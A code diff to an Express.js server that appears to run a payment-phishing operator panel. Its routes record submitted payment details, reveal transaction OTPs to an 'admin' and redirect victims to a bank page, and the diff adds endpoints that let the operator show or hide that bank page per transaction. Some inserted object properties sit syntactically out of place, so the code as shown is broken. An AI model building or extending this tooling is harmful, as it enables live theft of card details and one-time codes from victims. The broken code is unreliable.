@@ -90,7 +90,9 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   console.log("New transaction recorded:", transaction);
   res.json({ status: "success", invoiceId });
 });
-
+  redirectStatus: null, // Add this line
+  bankpageVisible: false // Add this new field
+};
 // Show OTP for a transaction (admin command)
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
@@ -185,7 +187,26 @@ app.post('/api/redirectToBankPage', (req, res) => {
   console.log(`Transaction ${invoiceId} redirected to bank page`);
   res.json({ status: "success", message: "Redirecting to bank page" });
 });
+// Bankpage control endpoints
+app.post('/api/showBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+  
+  txn.redirectStatus = 'bankpage';
+  txn.bankpageVisible = true;
+  res.json({ status: 'success' });
+});
 
+app.post('/api/hideBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+  
+  txn.redirectStatus = null;
+  txn.bankpageVisible = false;
+  res.json({ status: 'success' });
+});
 // MODIFY THIS EXISTING ENDPOINT (find checkTransactionStatus)
 
 // MODIFY THIS EXISTING ENDPOINT (find showOTP)
